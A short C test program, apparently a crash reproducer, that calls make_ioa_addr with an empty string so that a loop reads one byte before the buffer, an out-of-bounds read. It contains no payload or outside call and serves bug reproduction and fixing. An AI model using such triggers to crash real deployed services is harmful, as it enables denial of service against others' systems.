#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

// Forward declaration of the target function
int make_ioa_addr(const uint8_t *saddr, uint16_t port, void *ioa);

int main() {
    // We need to trigger the loop: while (len >= 0)
    // with an empty string so that len = 0, and it accesses saddr[-1].
    char *empty_str = strdup("");
    char ioa[1024];
    
    printf("Calling make_ioa_addr with empty string...\n");
    // This should trigger a crash due to saddr[len-1] where len=0
    make_ioa_addr((const uint8_t *)empty_str, 0, ioa);
    
    printf("Finished without crashing\n");
    free(empty_str);
    return 0;
}
